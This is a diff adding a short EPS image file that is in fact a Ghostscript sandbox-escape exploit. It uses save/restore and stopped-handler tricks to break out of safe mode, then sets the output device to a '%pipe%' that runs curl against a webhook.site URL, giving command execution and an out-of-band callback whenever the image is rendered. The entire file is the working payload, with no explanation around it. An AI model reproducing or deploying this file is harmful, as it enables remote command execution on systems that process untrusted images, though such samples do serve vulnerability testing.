@@ -1,0 +1,9 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%curl https://webhook.site/c888e46b-1c89-40f2-908e-11d25a9ac2c9) currentdevice putdeviceprops
